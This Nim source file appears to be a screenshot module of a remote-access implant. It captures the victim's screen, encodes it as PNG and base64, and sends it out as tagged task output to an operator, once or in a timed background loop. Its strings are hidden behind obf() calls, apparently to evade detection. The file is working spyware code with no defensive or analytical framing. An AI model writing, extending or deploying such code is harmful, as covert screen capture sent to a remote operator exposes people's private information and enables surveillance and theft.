from std/base64 import encode
import std/json
from std/locks import Lock, initLock, acquire, release
from std/random import rand
from std/strutils import parseInt, strip, toLowerAscii
import ../utils/global
import ../utils/tasks/buffer
import execution
import ../utils/linapi/handlers

var
  mtx: Lock
  mtxOk = false
  alive = false
  parked = true
  th: Pthread
  thActive = false

proc lockOn() =
  # Initializes the screen shot lock once
  if not mtxOk:
    initLock(mtx)
    mtxOk = true

proc pngBe32(n: uint32): array[4, byte] =
  # Returns a 32 bit value in big endian order
  [byte((n shr 24) and 0xFF'u32), byte((n shr 16) and 0xFF'u32), byte((n shr 8) and 0xFF'u32), byte(n and 0xFF'u32)]

proc pngCrc(data: openArray[byte]): uint32 =
  # Computes the PNG checksum of the given bytes
  var c = 0xFFFFFFFF'u32
  for b in data:
    c = c xor uint32(b)
    for _ in 0..7:
      if (c and 1'u32) != 0: c = (c shr 1) xor 0xEDB88320'u32
      else: c = c shr 1
  not c

proc pngChunk(dst: var seq[byte]; kind: cstring; data: openArray[byte]) =
  # Appends one PNG chunk to the buffer
  let off = dst.len
  dst.setLen(off + 12 + data.len)
  let ln = pngBe32(uint32(data.len))
  for i in 0..3: dst[off + i] = ln[i]
  for i in 0..3: dst[off + 4 + i] = byte(ord(kind[i]))
  if data.len > 0:
    copyMem(addr dst[off + 8], unsafeAddr data[0], data.len)
  var crcIn = newSeq[byte](4 + data.len)
  for i in 0..3: crcIn[i] = byte(ord(kind[i]))
  if data.len > 0:
    copyMem(addr crcIn[4], unsafeAddr data[0], data.len)
  let crc = pngBe32(pngCrc(crcIn))
  let crcOff = off + 8 + data.len
  for i in 0..3: dst[crcOff + i] = crc[i]

proc encodePng(bgra: openArray[byte]; w, h, stride: int): seq[byte] =
  # Encodes raw pixels into a PNG byte sequence
  var raw = newSeq[byte](h * (1 + w * 3))
  var di = 0
  for y in 0..<h:
    raw[di] = 0
    inc di
    let row = y * stride
    for x in 0..<w:
      let si = row + x * 4
      raw[di] = bgra[si + 2]
      raw[di + 1] = bgra[si + 1]
      raw[di + 2] = bgra[si]
      di += 3
  var idat = @[byte(0x78), byte(0x01)]
  var pos = 0
  while pos < raw.len:
    let n = min(65535, raw.len - pos)
    let fin = pos + n >= raw.len
    let off = idat.len
    idat.setLen(off + 5 + n)
    idat[off] = if fin: byte(1) else: byte(0)
    idat[off + 1] = byte(n and 0xFF)
    idat[off + 2] = byte((n shr 8) and 0xFF)
    let nlen = n xor 0xFFFF
    idat[off + 3] = byte(nlen and 0xFF)
    idat[off + 4] = byte((nlen shr 8) and 0xFF)
    copyMem(addr idat[off + 5], unsafeAddr raw[pos], n)
    pos += n
  var adA = 1'u32
  var adB = 0'u32
  for ch in raw:
    adA = (adA + uint32(ch)) mod 65521'u32
    adB = (adB + adA) mod 65521'u32
  let ad = (adB shl 16) or adA
  idat.add byte((ad shr 24) and 0xFF'u32)
  idat.add byte((ad shr 16) and 0xFF'u32)
  idat.add byte((ad shr 8) and 0xFF'u32)
  idat.add byte(ad and 0xFF'u32)
  result = @[
    byte(137'u8), byte(80'u8), byte(78'u8), byte(71'u8),
    byte(13'u8), byte(10'u8), byte(26'u8), byte(10'u8),
  ]
  var ihdr = newSeq[byte](13)
  let beW = pngBe32(uint32(w))
  let beH = pngBe32(uint32(h))
  for i in 0..3: ihdr[i] = beW[i]
  for i in 0..3: ihdr[4 + i] = beH[i]
  ihdr[8] = 8
  ihdr[9] = 2
  pngChunk(result, "IHDR", ihdr)
  pngChunk(result, "IDAT", idat)
  pngChunk(result, "IEND", [])

proc delayMs(params: string): culong =
  # Reads the delay in milliseconds from the params
  result = 2000
  if params.len == 0: return
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("delay")): return
    let d = p[obf("delay")]
    if d.kind == JsonNodeKind.JInt:
      let sec = d.getInt()
      if sec > 0: result = culong(sec * 1000)
    elif d.kind == JsonNodeKind.JString:
      let sec = parseInt(d.getStr())
      if sec > 0: result = culong(sec * 1000)
  except JsonParsingError:
    discard
  except ValueError:
    discard

proc wantsLoop(params: string): bool =
  # Checks that the params request a capture loop
  if params.len == 0: return false
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("loop")): return false
    let v = p[obf("loop")]
    if v.kind == JsonNodeKind.JBool: return v.getBool()
    if v.kind == JsonNodeKind.JInt: return v.getInt() != 0
    let s = v.getStr().strip().toLowerAscii()
    s in [obf("true"), obf("1"), obf("loop"), obf("start")]
  except JsonParsingError:
    false

proc grab(): (string, string) =
  # Captures the screen and encodes it as a PNG
  let pre = pretestCapture()
  if pre.len > 0:
    return ("", pre)
  try:
    let cap = captureScreenBgra()
    if not cap.ok:
      if cap.error.len > 0:
        return ("", cap.error)
      return ("", obf("Screen capture failed"))
    if cap.data.len == 0 or cap.w <= 0 or cap.h <= 0:
      return ("", obf("Screen capture returned empty image"))
    let png = encodePng(toOpenArray(cap.data, 0, cap.data.len - 1), cap.w, cap.h, cap.stride)
    if png.len == 0:
      return ("", obf("PNG encode failed"))
    (encode(png), "")
  except CatchableError as e:
    ("", e.msg)

proc send(b64: string) =
  # Sends the encoded screen shot as task output
  if b64.len == 0: return
  let payload = $(%*{
    obf("option"): obf("output"),
    obf("type"): obf("screenshot"),
    obf("task_tag"): $rand(100_000_000 .. 999_999_999),
    obf("host_tag"): hostTag,
    obf("content"): b64,
  })
  discard apply_task_output(payload)

proc workerMain(p: pointer): pointer {.noconv.} =
  # Main loop that captures screen shots on a delay
  defer:
    dec bgWorkers
  let heap = cast[ptr string](p)
  let params = heap[]
  dealloc(heap)
  let wait = delayMs(params)

  while true:
    lockOn()
    acquire(mtx)
    if not alive:
      parked = true
      release(mtx)
      sleepMs(50)
      continue
    parked = false
    release(mtx)

    let (b64, err) = grab()
    if err.len == 0:
      send(b64)
    sleepMs(wait)

proc stop*() =
  # Stops the screen shot loop
  lockOn()
  acquire(mtx)
  alive = false
  release(mtx)
  if not thActive: return
  for _ in 0 ..< 500:
    lockOn()
    acquire(mtx)
    let p = parked
    release(mtx)
    if p: break
    sleepMs(10)

proc startLoop(params: string; buf: var openArray[char]): int =
  # Starts the screen shot loop in a background thread
  let pre = pretestCapture()
  if pre.len > 0:
    return writeMsg(obf("Error: ") & pre, buf)
  lockOn()
  acquire(mtx)
  if thActive and alive:
    release(mtx)
    return writeMsg(obf("Error: screenshot already running"), buf)
  let needThread = not thActive
  alive = true
  parked = false
  release(mtx)

  if needThread:
    let heap = cast[ptr string](alloc0(sizeof(string)))
    heap[] = params
    inc bgWorkers
    var tid: Pthread
    if not spawnPthread(tid, workerMain, cast[pointer](heap)):
      dec bgWorkers
      dealloc(heap)
      lockOn()
      acquire(mtx)
      alive = false
      release(mtx)
      return writeMsg(obf("Error: screenshot start failed"), buf)
    lockOn()
    acquire(mtx)
    th = tid
    thActive = true
    release(mtx)

  writeMsg(obf("Screenshot loop started."), buf)

proc run_screenshot*(params: string; buf: var openArray[char]): int =
  # Entrypoint that captures once or starts the loop
  if wantsLoop(params): return startLoop(params, buf)
  let (b64, err) = grab()
  if err.len > 0:
    return writeMsg(obf("Error: ") & err, buf)
  send(b64)
  writeMsg(obf("Screenshot captured."), buf)

proc run_screenshot_start*(params: string; buf: var openArray[char]): int =
  # Entrypoint that starts the screen shot loop
  startLoop(params, buf)

proc run_screenshot_stop*(_: string; buf: var openArray[char]): int =
  # Entrypoint that stops the screen shot loop
  stop()
  writeMsg(obf("Screenshot loop stopped."), buf)
